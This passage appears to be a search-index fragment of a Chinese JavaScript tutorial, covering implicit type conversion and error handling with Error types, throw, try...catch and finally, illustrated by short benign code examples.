\u8bed\u53e5\u7684\u6761\u4ef6\u90e8\u5206\uff09\uff0c\u5c31\u4f1a\u5c06\u975e\u5e03\u5c14\u503c\u7684\u53c2\u6570\u81ea\u52a8\u8f6c\u6362\u4e3a\u5e03\u5c14\u503c\u3002\u7cfb\u7edf\u5185\u90e8\u4f1a\u81ea\u52a8\u8c03\u7528 Boolean() \u51fd\u6570\u3002 \u56e0\u6b64\u9664\u4e86\u4ee5\u4e0b\u4e94\u4e2a\u503c\uff0c\u5176\u4ed6\u90fd\u662f\u81ea\u52a8\u8f6c\u4e3a true \u3002 undefined null +0 \u6216 -0 NaN '' \uff08\u7a7a\u5b57\u7b26\u4e32\uff09 \u4e0b\u9762\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u6761\u4ef6\u90e8\u5206\u7684\u6bcf\u4e2a\u503c\u90fd\u76f8\u5f53\u4e8e false \uff0c\u4f7f\u7528\u5426\u5b9a\u8fd0\u7b97\u7b26\u540e\uff0c\u5c31\u53d8\u6210\u4e86 true \u3002 1 2 3 4 5 6 7 8 if ( ! undefined && ! null && ! 0 && ! NaN && ! '' ) { console . log ( 'true' ); } // true \u4e0b\u9762\u4e24\u79cd\u5199\u6cd5\uff0c\u6709\u65f6\u4e5f\u7528\u4e8e\u5c06\u4e00\u4e2a\u8868\u8fbe\u5f0f\u8f6c\u4e3a\u5e03\u5c14\u503c\u3002\u5b83\u4eec\u5185\u90e8\u8c03\u7528\u7684\u4e5f\u662f Boolean() \u51fd\u6570\u3002 1 2 3 4 5 // \u5199\u6cd5\u4e00 expression ? true : false // \u5199\u6cd5\u4e8c !! expression","title":"\u81ea\u52a8\u8f6c\u6362\u4e3a\u5e03\u5c14\u503c"},{"location":"features/conversion/#_6","text":"JavaScript \u9047\u5230\u9884\u671f\u4e3a\u5b57\u7b26\u4e32\u7684\u5730\u65b9\uff0c\u5c31\u4f1a\u5c06\u975e\u5b57\u7b26\u4e32\u7684\u503c\u81ea\u52a8\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002\u5177\u4f53\u89c4\u5219\u662f\uff0c\u5148\u5c06\u590d\u5408\u7c7b\u578b\u7684\u503c\u8f6c\u4e3a\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u518d\u5c06\u539f\u59cb\u7c7b\u578b\u7684\u503c\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002 \u5b57\u7b26\u4e32\u7684\u81ea\u52a8\u8f6c\u6362\uff0c\u4e3b\u8981\u53d1\u751f\u5728\u5b57\u7b26\u4e32\u7684\u52a0\u6cd5\u8fd0\u7b97\u65f6\u3002\u5f53\u4e00\u4e2a\u503c\u4e3a\u5b57\u7b26\u4e32\uff0c\u53e6\u4e00\u4e2a\u503c\u4e3a\u975e\u5b57\u7b26\u4e32\uff0c\u5219\u540e\u8005\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 7 8 '5' + 1 // '51' '5' + true // \"5true\" '5' + false // \"5false\" '5' + {} // \"5[object Object]\" '5' + [] // \"5\" '5' + function (){} // \"5function (){}\" '5' + undefined // \"5undefined\" '5' + null // \"5null\" \u8fd9\u79cd\u81ea\u52a8\u8f6c\u6362\u5f88\u5bb9\u6613\u51fa\u9519\u3002 1 2 3 4 5 var obj = { width : '100' }; obj . width + 20 // \"10020\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5f00\u53d1\u8005\u53ef\u80fd\u671f\u671b\u8fd4\u56de 120 \uff0c\u4f46\u662f\u7531\u4e8e\u81ea\u52a8\u8f6c\u6362\uff0c\u5b9e\u9645\u4e0a\u8fd4\u56de\u4e86\u4e00\u4e2a\u5b57\u7b26 10020 \u3002","title":"\u81ea\u52a8\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32"},{"location":"features/conversion/#_7","text":"JavaScript \u9047\u5230\u9884\u671f\u4e3a\u6570\u503c\u7684\u5730\u65b9\uff0c\u5c31\u4f1a\u5c06\u53c2\u6570\u503c\u81ea\u52a8\u8f6c\u6362\u4e3a\u6570\u503c\u3002\u7cfb\u7edf\u5185\u90e8\u4f1a\u81ea\u52a8\u8c03\u7528 Number() \u51fd\u6570\u3002 \u9664\u4e86\u52a0\u6cd5\u8fd0\u7b97\u7b26\uff08 + \uff09\u6709\u53ef\u80fd\u628a\u8fd0\u7b97\u5b50\u8f6c\u4e3a\u5b57\u7b26\u4e32\uff0c\u5176\u4ed6\u8fd0\u7b97\u7b26\u90fd\u4f1a\u628a\u8fd0\u7b97\u5b50\u81ea\u52a8\u8f6c\u6210\u6570\u503c\u3002 1 2 3 4 5 6 7 8 9 10 '5' - '2' // 3 '5' * '2' // 10 true - 1 // 0 false - 1 // -1 '1' - 1 // 0 '5' * [] // 0 false / '5' // 0 'abc' - 1 // NaN null + 1 // 1 undefined + 1 // NaN \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8fd0\u7b97\u7b26\u4e24\u4fa7\u7684\u8fd0\u7b97\u5b50\uff0c\u90fd\u88ab\u8f6c\u6210\u4e86\u6570\u503c\u3002 \u6ce8\u610f\uff1a null \u8f6c\u4e3a\u6570\u503c\u65f6\u4e3a 0 \uff0c\u800c undefined \u8f6c\u4e3a\u6570\u503c\u65f6\u4e3a NaN \u3002 \u4e00\u5143\u8fd0\u7b97\u7b26\u4e5f\u4f1a\u628a\u8fd0\u7b97\u5b50\u8f6c\u6210\u6570\u503c\u3002 1 2 3 4 + 'abc' // NaN - 'abc' // NaN + true // 1 - false // 0","title":"\u81ea\u52a8\u8f6c\u6362\u4e3a\u6570\u503c"},{"location":"features/conversion/#_8","text":"Axel Rauschmayer, What is {} + {} in JavaScript? Axel Rauschmayer, JavaScript quirk 1: implicit conversion of values Benjie Gillam, Quantum JavaScript?","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"features/error/","text":"\u9519\u8bef\u5904\u7406\u673a\u5236 \u00b6 Error \u5b9e\u4f8b\u5bf9\u8c61 \u00b6 JavaScript \u89e3\u6790\u6216\u8fd0\u884c\u65f6\uff0c\u4e00\u65e6\u53d1\u751f\u9519\u8bef\uff0c\u5f15\u64ce\u5c31\u4f1a\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\u5bf9\u8c61\u3002JavaScript \u539f\u751f\u63d0\u4f9b Error \u6784\u9020\u51fd\u6570\uff0c\u6240\u6709\u629b\u51fa\u7684\u9519\u8bef\u90fd\u662f\u8fd9\u4e2a\u6784\u9020\u51fd\u6570\u7684\u5b9e\u4f8b\u3002 1 2 var err = new Error ( '\u51fa\u9519\u4e86' ); err . message // \"\u51fa\u9519\u4e86\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6211\u4eec\u8c03\u7528 Error() \u6784\u9020\u51fd\u6570\uff0c\u751f\u6210\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61 err \u3002 Error() \u6784\u9020\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u53c2\u6570\uff0c\u8868\u793a\u9519\u8bef\u63d0\u793a\uff0c\u53ef\u4ee5\u4ece\u5b9e\u4f8b\u7684 message \u5c5e\u6027\u8bfb\u5230\u8fd9\u4e2a\u53c2\u6570\u3002\u629b\u51fa Error \u5b9e\u4f8b\u5bf9\u8c61\u4ee5\u540e\uff0c\u6574\u4e2a\u7a0b\u5e8f\u5c31\u4e2d\u65ad\u5728\u53d1\u751f\u9519\u8bef\u7684\u5730\u65b9\uff0c\u4e0d\u518d\u5f80\u4e0b\u6267\u884c\u3002 JavaScript \u8bed\u8a00\u6807\u51c6\u53ea\u63d0\u5230\uff0c Error \u5b9e\u4f8b\u5bf9\u8c61\u5fc5\u987b\u6709 message \u5c5e\u6027\uff0c\u8868\u793a\u51fa\u9519\u65f6\u7684\u63d0\u793a\u4fe1\u606f\uff0c\u6ca1\u6709\u63d0\u5230\u5176\u4ed6\u5c5e\u6027\u3002\u5927\u591a\u6570 JavaScript \u5f15\u64ce\uff0c\u5bf9 Error \u5b9e\u4f8b\u8fd8\u63d0\u4f9b name \u548c stack \u5c5e\u6027\uff0c\u5206\u522b\u8868\u793a\u9519\u8bef\u7684\u540d\u79f0\u548c\u9519\u8bef\u7684\u5806\u6808\uff0c\u4f46\u5b83\u4eec\u662f\u975e\u6807\u51c6\u7684\uff0c\u4e0d\u662f\u6bcf\u79cd\u5b9e\u73b0\u90fd\u6709\u3002 message \uff1a\u9519\u8bef\u63d0\u793a\u4fe1\u606f name \uff1a\u9519\u8bef\u540d\u79f0\uff08\u975e\u6807\u51c6\u5c5e\u6027\uff09 stack \uff1a\u9519\u8bef\u7684\u5806\u6808\uff08\u975e\u6807\u51c6\u5c5e\u6027\uff09 \u4f7f\u7528 name \u548c message \u8fd9\u4e24\u4e2a\u5c5e\u6027\uff0c\u53ef\u4ee5\u5bf9\u53d1\u751f\u4ec0\u4e48\u9519\u8bef\u6709\u4e00\u4e2a\u5927\u6982\u7684\u4e86\u89e3\u3002 1 2 3 if ( error . name ) { console . log ( error . name + ': ' + error . message ); } stack \u5c5e\u6027\u7528\u6765\u67e5\u770b\u9519\u8bef\u53d1\u751f\u65f6\u7684\u5806\u6808\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function throwit () { throw new Error ( '' ); } function catchit () { try { throwit (); } catch ( e ) { console . log ( e . stack ); // print stack trace } } catchit () // Error // at throwit (~/examples/throwcatch.js:9:11) // at catchit (~/examples/throwcatch.js:3:9) // at repl:1:5 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u9519\u8bef\u5806\u6808\u7684\u6700\u5185\u5c42\u662f throwit \u51fd\u6570\uff0c\u7136\u540e\u662f catchit \u51fd\u6570\uff0c\u6700\u540e\u662f\u51fd\u6570\u7684\u8fd0\u884c\u73af\u5883\u3002 \u539f\u751f\u9519\u8bef\u7c7b\u578b \u00b6 Error \u5b9e\u4f8b\u5bf9\u8c61\u662f\u6700\u4e00\u822c\u7684\u9519\u8bef\u7c7b\u578b\uff0c\u5728\u5b83\u7684\u57fa\u7840\u4e0a\uff0cJavaScript \u8fd8\u5b9a\u4e49\u4e86\u5176\u4ed66\u79cd\u9519\u8bef\u5bf9\u8c61\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5b58\u5728 Error \u76846\u4e2a\u6d3e\u751f\u5bf9\u8c61\u3002 SyntaxError \u5bf9\u8c61 \u00b6 SyntaxError \u5bf9\u8c61\u662f\u89e3\u6790\u4ee3\u7801\u65f6\u53d1\u751f\u7684\u8bed\u6cd5\u9519\u8bef\u3002 1 2 3 4 5 6 7 // \u53d8\u91cf\u540d\u9519\u8bef var 1 a ; // Uncaught SyntaxError: Invalid or unexpected token // \u7f3a\u5c11\u62ec\u53f7 console . log 'hello' ); // Uncaught SyntaxError: Unexpected string \u4e0a\u9762\u4ee3\u7801\u7684\u9519\u8bef\uff0c\u90fd\u662f\u5728\u8bed\u6cd5\u89e3\u6790\u9636\u6bb5\u5c31\u53ef\u4ee5\u53d1\u73b0\uff0c\u6240\u4ee5\u4f1a\u629b\u51fa SyntaxError \u3002\u7b2c\u4e00\u4e2a\u9519\u8bef\u63d0\u793a\u662f\u201ctoken \u975e\u6cd5\u201d\uff0c\u7b2c\u4e8c\u4e2a\u9519\u8bef\u63d0\u793a\u662f\u201c\u5b57\u7b26\u4e32\u4e0d\u7b26\u5408\u8981\u6c42\u201d\u3002 ReferenceError \u5bf9\u8c61 \u00b6 ReferenceError \u5bf9\u8c61\u662f\u5f15\u7528\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u53d8\u91cf\u65f6\u53d1\u751f\u7684\u9519\u8bef\u3002 1 2 3 // \u4f7f\u7528\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u53d8\u91cf unknownVariable // Uncaught ReferenceError: unknownVariable is not defined \u53e6\u4e00\u79cd\u89e6\u53d1\u573a\u666f\u662f\uff0c\u5c06\u4e00\u4e2a\u503c\u5206\u914d\u7ed9\u65e0\u6cd5\u5206\u914d\u7684\u5bf9\u8c61\uff0c\u6bd4\u5982\u5bf9\u51fd\u6570\u7684\u8fd0\u884c\u7ed3\u679c\u8d4b\u503c\u3002 1 2 3 // \u7b49\u53f7\u5de6\u4fa7\u4e0d\u662f\u53d8\u91cf console . log () = 1 // Uncaught ReferenceError: Invalid left-hand side in assignment \u4e0a\u9762\u4ee3\u7801\u5bf9\u51fd\u6570 console.log \u7684\u8fd0\u884c\u7ed3\u679c\u8d4b\u503c\uff0c\u7ed3\u679c\u5f15\u53d1\u4e86 ReferenceError \u9519\u8bef\u3002 RangeError \u5bf9\u8c61 \u00b6 RangeError \u5bf9\u8c61\u662f\u4e00\u4e2a\u503c\u8d85\u51fa\u6709\u6548\u8303\u56f4\u65f6\u53d1\u751f\u7684\u9519\u8bef\u3002\u4e3b\u8981\u6709\u51e0\u79cd\u60c5\u51b5\uff0c\u4e00\u662f\u6570\u7ec4\u957f\u5ea6\u4e3a\u8d1f\u6570\uff0c\u4e8c\u662f Number \u5bf9\u8c61\u7684\u65b9\u6cd5\u53c2\u6570\u8d85\u51fa\u8303\u56f4\uff0c\u4ee5\u53ca\u51fd\u6570\u5806\u6808\u8d85\u8fc7\u6700\u5927\u503c\u3002 1 2 3 // \u6570\u7ec4\u957f\u5ea6\u4e0d\u5f97\u4e3a\u8d1f\u6570 new Array ( - 1 ) // Uncaught RangeError: Invalid array length TypeError \u5bf9\u8c61 \u00b6 TypeError \u5bf9\u8c61\u662f\u53d8\u91cf\u6216\u53c2\u6570\u4e0d\u662f\u9884\u671f\u7c7b\u578b\u65f6\u53d1\u751f\u7684\u9519\u8bef\u3002\u6bd4\u5982\uff0c\u5bf9\u5b57\u7b26\u4e32\u3001\u5e03\u5c14\u503c\u3001\u6570\u503c\u7b49\u539f\u59cb\u7c7b\u578b\u7684\u503c\u4f7f\u7528 new \u547d\u4ee4\uff0c\u5c31\u4f1a\u629b\u51fa\u8fd9\u79cd\u9519\u8bef\uff0c\u56e0\u4e3a new \u547d\u4ee4\u7684\u53c2\u6570\u5e94\u8be5\u662f\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u3002 1 2 3 4 5 6 new 123 // Uncaught TypeError: 123 is not a constructor var obj = {}; obj . unknownMethod () // Uncaught TypeError: obj.unknownMethod is not a function \u4e0a\u9762\u4ee3\u7801\u7684\u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0c\u8c03\u7528\u5bf9\u8c61\u4e0d\u5b58\u5728\u7684\u65b9\u6cd5\uff0c\u4e5f\u4f1a\u629b\u51fa TypeError \u9519\u8bef\uff0c\u56e0\u4e3a obj.unknownMethod \u7684\u503c\u662f undefined \uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u51fd\u6570\u3002 URIError \u5bf9\u8c61 \u00b6 URIError \u5bf9\u8c61\u662f URI \u76f8\u5173\u51fd\u6570\u7684\u53c2\u6570\u4e0d\u6b63\u786e\u65f6\u629b\u51fa\u7684\u9519\u8bef\uff0c\u4e3b\u8981\u6d89\u53ca encodeURI() \u3001 decodeURI() \u3001 encodeURIComponent() \u3001 decodeURIComponent() \u3001 escape() \u548c unescape() \u8fd9\u516d\u4e2a\u51fd\u6570\u3002 1 2 decodeURI ( '%2' ) // URIError: URI malformed EvalError \u5bf9\u8c61 \u00b6 eval \u51fd\u6570\u6ca1\u6709\u88ab\u6b63\u786e\u6267\u884c\u65f6\uff0c\u4f1a\u629b\u51fa EvalError \u9519\u8bef\u3002\u8be5\u9519\u8bef\u7c7b\u578b\u5df2\u7ecf\u4e0d\u518d\u4f7f\u7528\u4e86\uff0c\u53ea\u662f\u4e3a\u4e86\u4fdd\u8bc1\u4e0e\u4ee5\u524d\u4ee3\u7801\u517c\u5bb9\uff0c\u624d\u7ee7\u7eed\u4fdd\u7559\u3002 \u603b\u7ed3 \u00b6 \u4ee5\u4e0a\u8fd96\u79cd\u6d3e\u751f\u9519\u8bef\uff0c\u8fde\u540c\u539f\u59cb\u7684 Error \u5bf9\u8c61\uff0c\u90fd\u662f\u6784\u9020\u51fd\u6570\u3002\u5f00\u53d1\u8005\u53ef\u4ee5\u4f7f\u7528\u5b83\u4eec\uff0c\u624b\u52a8\u751f\u6210\u9519\u8bef\u5bf9\u8c61\u7684\u5b9e\u4f8b\u3002\u8fd9\u4e9b\u6784\u9020\u51fd\u6570\u90fd\u63a5\u53d7\u4e00\u4e2a\u53c2\u6570\uff0c\u4ee3\u8868\u9519\u8bef\u63d0\u793a\u4fe1\u606f\uff08message\uff09\u3002 1 2 3 4 5 6 7 var err1 = new Error ( '\u51fa\u9519\u4e86\uff01' ); var err2 = new RangeError ( '\u51fa\u9519\u4e86\uff0c\u53d8\u91cf\u8d85\u51fa\u6709\u6548\u8303\u56f4\uff01' ); var err3 = new TypeError ( '\u51fa\u9519\u4e86\uff0c\u53d8\u91cf\u7c7b\u578b\u65e0\u6548\uff01' ); err1 . message // \"\u51fa\u9519\u4e86\uff01\" err2 . message // \"\u51fa\u9519\u4e86\uff0c\u53d8\u91cf\u8d85\u51fa\u6709\u6548\u8303\u56f4\uff01\" err3 . message // \"\u51fa\u9519\u4e86\uff0c\u53d8\u91cf\u7c7b\u578b\u65e0\u6548\uff01\" \u81ea\u5b9a\u4e49\u9519\u8bef \u00b6 \u9664\u4e86 JavaScript \u539f\u751f\u63d0\u4f9b\u7684\u4e03\u79cd\u9519\u8bef\u5bf9\u8c61\uff0c\u8fd8\u53ef\u4ee5\u5b9a\u4e49\u81ea\u5df1\u7684\u9519\u8bef\u5bf9\u8c61\u3002 1 2 3 4 5 6 7 function UserError ( message ) { this . message = message || '\u9ed8\u8ba4\u4fe1\u606f' ; this . name = 'UserError' ; } UserError . prototype = new Error (); UserError . prototype . constructor = UserError ; \u4e0a\u9762\u4ee3\u7801\u81ea\u5b9a\u4e49\u4e00\u4e2a\u9519\u8bef\u5bf9\u8c61 UserError \uff0c\u8ba9\u5b83\u7ee7\u627f Error \u5bf9\u8c61\u3002\u7136\u540e\uff0c\u5c31\u53ef\u4ee5\u751f\u6210\u8fd9\u79cd\u81ea\u5b9a\u4e49\u7c7b\u578b\u7684\u9519\u8bef\u4e86\u3002 1 new UserError ( '\u8fd9\u662f\u81ea\u5b9a\u4e49\u7684\u9519\u8bef\uff01' ); throw \u8bed\u53e5 \u00b6 throw \u8bed\u53e5\u7684\u4f5c\u7528\u662f\u624b\u52a8\u4e2d\u65ad\u7a0b\u5e8f\u6267\u884c\uff0c\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\u3002 1 2 3 4 5 6 var x = - 1 ; if ( x <= 0 ) { throw new Error ( 'x \u5fc5\u987b\u4e3a\u6b63\u6570' ); } // Uncaught Error: x \u5fc5\u987b\u4e3a\u6b63\u6570 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u53d8\u91cf x \u5c0f\u4e8e\u7b49\u4e8e 0 \uff0c\u5c31\u624b\u52a8\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\uff0c\u544a\u8bc9\u7528\u6237 x \u7684\u503c\u4e0d\u6b63\u786e\uff0c\u6574\u4e2a\u7a0b\u5e8f\u5c31\u4f1a\u5728\u8fd9\u91cc\u4e2d\u65ad\u6267\u884c\u3002\u53ef\u4ee5\u770b\u5230\uff0c throw \u629b\u51fa\u7684\u9519\u8bef\u5c31\u662f\u5b83\u7684\u53c2\u6570\uff0c\u8fd9\u91cc\u662f\u4e00\u4e2a Error \u5bf9\u8c61\u7684\u5b9e\u4f8b\u3002 throw \u4e5f\u53ef\u4ee5\u629b\u51fa\u81ea\u5b9a\u4e49\u9519\u8bef\u3002 1 2 3 4 5 6 7 function UserError ( message ) { this . message = message || '\u9ed8\u8ba4\u4fe1\u606f' ; this . name = 'UserError' ; } throw new UserError ( '\u51fa\u9519\u4e86\uff01' ); // Uncaught UserError {message: \"\u51fa\u9519\u4e86\uff01\", name: \"UserError\"} \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c throw \u629b\u51fa\u7684\u662f\u4e00\u4e2a UserError \u5b9e\u4f8b\u3002 \u5b9e\u9645\u4e0a\uff0c throw \u53ef\u4ee5\u629b\u51fa\u4efb\u4f55\u7c7b\u578b\u7684\u503c\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5b83\u7684\u53c2\u6570\u53ef\u4ee5\u662f\u4efb\u4f55\u503c\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // \u629b\u51fa\u4e00\u4e2a\u5b57\u7b26\u4e32 throw 'Error\uff01' ; // Uncaught Error\uff01 // \u629b\u51fa\u4e00\u4e2a\u6570\u503c throw 42 ; // Uncaught 42 // \u629b\u51fa\u4e00\u4e2a\u5e03\u5c14\u503c throw true ; // Uncaught true // \u629b\u51fa\u4e00\u4e2a\u5bf9\u8c61 throw { toString : function () { return 'Error!' ; } }; // Uncaught {toString: \u0192} \u5bf9\u4e8e JavaScript \u5f15\u64ce\u6765\u8bf4\uff0c\u9047\u5230 throw \u8bed\u53e5\uff0c\u7a0b\u5e8f\u5c31\u4e2d\u6b62\u4e86\u3002\u5f15\u64ce\u4f1a\u63a5\u6536\u5230 throw \u629b\u51fa\u7684\u4fe1\u606f\uff0c\u53ef\u80fd\u662f\u4e00\u4e2a\u9519\u8bef\u5b9e\u4f8b\uff0c\u4e5f\u53ef\u80fd\u662f\u5176\u4ed6\u7c7b\u578b\u7684\u503c\u3002 try...catch \u7ed3\u6784 \u00b6 \u4e00\u65e6\u53d1\u751f\u9519\u8bef\uff0c\u7a0b\u5e8f\u5c31\u4e2d\u6b62\u6267\u884c\u4e86\u3002JavaScript \u63d0\u4f9b\u4e86 try...catch \u7ed3\u6784\uff0c\u5141\u8bb8\u5bf9\u9519\u8bef\u8fdb\u884c\u5904\u7406\uff0c\u9009\u62e9\u662f\u5426\u5f80\u4e0b\u6267\u884c\u3002 1 2 3 4 5 6 7 8 9 try { throw new Error ( '\u51fa\u9519\u4e86!' ); } catch ( e ) { console . log ( e . name + \": \" + e . message ); console . log ( e . stack ); } // Error: \u51fa\u9519\u4e86! // at <anonymous>:3:9 // ... \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c try \u4ee3\u7801\u5757\u629b\u51fa\u9519\u8bef\uff08\u4e0a\u4f8b\u7528\u7684\u662f throw \u8bed\u53e5\uff09\uff0cJavaScript \u5f15\u64ce\u5c31\u7acb\u5373\u628a\u4ee3\u7801\u7684\u6267\u884c\uff0c\u8f6c\u5230 catch \u4ee3\u7801\u5757\uff0c\u6216\u8005\u8bf4\u9519\u8bef\u88ab catch \u4ee3\u7801\u5757\u6355\u83b7\u4e86\u3002 catch \u63a5\u53d7\u4e00\u4e2a\u53c2\u6570\uff0c\u8868\u793a try \u4ee3\u7801\u5757\u629b\u51fa\u7684\u503c\u3002 \u5982\u679c\u4f60\u4e0d\u786e\u5b9a\u67d0\u4e9b\u4ee3\u7801\u662f\u5426\u4f1a\u62a5\u9519\uff0c\u5c31\u53ef\u4ee5\u628a\u5b83\u4eec\u653e\u5728 try...catch \u4ee3\u7801\u5757\u4e4b\u4e2d\uff0c\u4fbf\u4e8e\u8fdb\u4e00\u6b65\u5bf9\u9519\u8bef\u8fdb\u884c\u5904\u7406\u3002 1 2 3 4 5 try { f (); } catch ( e ) { // \u5904\u7406\u9519\u8bef } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u51fd\u6570 f \u6267\u884c\u62a5\u9519\uff0c\u5c31\u4f1a\u8fdb\u884c catch \u4ee3\u7801\u5757\uff0c\u63a5\u7740\u5bf9\u9519\u8bef\u8fdb\u884c\u5904\u7406\u3002 catch \u4ee3\u7801\u5757\u6355\u83b7\u9519\u8bef\u4e4b\u540e\uff0c\u7a0b\u5e8f\u4e0d\u4f1a\u4e2d\u65ad\uff0c\u4f1a\u6309\u7167\u6b63\u5e38\u6d41\u7a0b\u7ee7\u7eed\u6267\u884c\u4e0b\u53bb\u3002 1 2 3 4 5 6 7 8 try { throw \"\u51fa\u9519\u4e86\" ; } catch ( e ) { console . log ( 111 ); } console . log ( 222 ); // 111 // 222 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c try \u4ee3\u7801\u5757\u629b\u51fa\u7684\u9519\u8bef\uff0c\u88ab catch \u4ee3\u7801\u5757\u6355\u83b7\u540e\uff0c\u7a0b\u5e8f\u4f1a\u7ee7\u7eed\u5411\u4e0b\u6267\u884c\u3002 catch \u4ee3\u7801\u5757\u4e4b\u4e2d\uff0c\u8fd8\u53ef\u4ee5\u518d\u629b\u51fa\u9519\u8bef\uff0c\u751a\u81f3\u4f7f\u7528\u5d4c\u5957\u7684 try...catch \u7ed3\u6784\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var n = 100 ; try { throw n ; } catch ( e ) { if ( e <= 50 ) { // ... } else { throw e ; } } // Uncaught 100 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c catch \u4ee3\u7801\u4e4b\u4e2d\u53c8\u629b\u51fa\u4e86\u4e00\u4e2a\u9519\u8bef\u3002 \u4e3a\u4e86\u6355\u6349\u4e0d\u540c\u7c7b\u578b\u7684\u9519\u8bef\uff0c catch \u4ee3\u7801\u5757\u4e4b\u4e2d\u53ef\u4ee5\u52a0\u5165\u5224\u65ad\u8bed\u53e5\u3002 1 2 3 4 5 6 7 8 9 10 try { foo . bar (); } catch ( e ) { if ( e instanceof EvalError ) { console . log ( e . name + \": \" + e . message ); } else if ( e instanceof RangeError ) { console . log ( e . name + \": \" + e . message ); } // ... } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c catch \u6355\u83b7\u9519\u8bef\u4e4b\u540e\uff0c\u4f1a\u5224\u65ad\u9519\u8bef\u7c7b\u578b\uff08 EvalError \u8fd8\u662f RangeError \uff09\uff0c\u8fdb\u884c\u4e0d\u540c\u7684\u5904\u7406\u3002 finally \u4ee3\u7801\u5757 \u00b6 try...catch \u7ed3\u6784\u5141\u8bb8\u5728\u6700\u540e\u6dfb\u52a0\u4e00\u4e2a finally \u4ee3\u7801\u5757\uff0c\u8868\u793a\u4e0d\u7ba1\u662f\u5426\u51fa\u73b0\u9519\u8bef\uff0c\u90fd\u5fc5\u9700\u5728\u6700\u540e\u8fd0\u884c\u7684\u8bed\u53e5\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 function cleansUp () { try { throw new Error ( '\u51fa\u9519\u4e86\u2026\u2026' ); console . log ( '\u6b64\u884c\u4e0d\u4f1a\u6267\u884c' ); } finally { console . log ( '\u5b8c\u6210\u6e05\u7406\u5de5\u4f5c' ); } } cleansUp () // \u5b8c\u6210\u6e05\u7406\u5de5\u4f5c // Uncaught Error: \u51fa\u9519\u4e86\u2026\u2026 // at cleansUp (<anonymous>:3:11) // at <anonymous>:10:1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e\u6ca1\u6709 catch \u8bed\u53e5\u5757\uff0c\u4e00\u65e6\u53d1\u751f\u9519\u8bef\uff0c\u4ee3\u7801\u5c31\u4f1a\u4e2d\u65ad\u6267\u884c\u3002\u4e2d\u65ad\u6267\u884c\u4e4b\u524d\uff0c\u4f1a\u5148\u6267\u884c finally \u4ee3\u7801\u5757\uff0c\u7136\u540e\u518d\u5411\u7528\u6237\u63d0\u793a\u62a5\u9519\u4fe1\u606f\u3002 1 2 3 4 5 6 7 8 9 10 11 12 function idle ( x ) { try { console . log ( x ); return 'result' ; } finally { console . log ( 'FINALLY' ); } } idle ( 'hello' ) // hello // FINALLY \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c try \u4ee3\u7801\u5757\u6ca1\u6709\u53d1\u751f\u9519\u8bef\uff0c\u800c\u4e14\u91cc\u9762\u8fd8\u5305\u62ec return \u8bed\u53e5\uff0c\u4f46\u662f finally \u4ee3\u7801\u5757\u4f9d\u7136\u4f1a\u6267\u884c\u3002\u800c\u4e14\uff0c\u8fd9\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u8fd8\u662f result \u3002 \u4e0b\u9762\u7684\u4f8b\u5b50\u8bf4\u660e\uff0c return \u8bed\u53e5\u7684\u6267\u884c\u662f\u6392\u5728 finally \u4ee3\u7801\u4e4b\u524d\uff0c\u53ea\u662f\u7b49 finally \u4ee3\u7801\u6267\u884c\u5b8c\u6bd5\u540e\u624d\u8fd4\u56de\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var count = 0 ; function countUp () { try { return count ; } finally { count ++ ; } } countUp () // 0 count // 1 \u4e0a\u9762\u4ee3\u7801\u8bf4\u660e\uff0c return \u8bed\u53e5\u91cc\u9762\u7684 count \u7684\u503c\uff0c\u662f\u5728 finally \u4ee3\u7801\u5757\u8fd0\u884c\u4e4b\u524d\u5c31\u83b7\u53d6\u4e86\u3002 \u4e0b\u9762\u662f finally \u4ee3\u7801\u5757\u7528\u6cd5\u7684\u5178\u578b\u573a\u666f\u3002 1 2 3 4 5 6 7 8 9 openFile (); try { writeFile ( Data ); } catch ( e ) { handleError ( e ); } finally { closeFile (); } \u4e0a\u9762\u4ee3\u7801\u9996\u5148\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\uff0c\u7136\u540e\u5728 try \u4ee3\u7801\u5757\u4e2d\u5199\u5165\u6587\u4ef6\uff0c\u5982\u679c\u6ca1\u6709\u53d1\u751f\u9519\u8bef\uff0c\u5219\u8fd0\u884c finally \u4ee3\u7801\u5757\u5173\u95ed\u6587\u4ef6\uff1b\u4e00\u65e6\u53d1\u751f\u9519\u8bef\uff0c\u5219\u5148\u4f7f\u7528 catch \u4ee3\u7801\u5757\u5904\u7406\u9519\u8bef\uff0c\u518d\u4f7f\u7528 finally 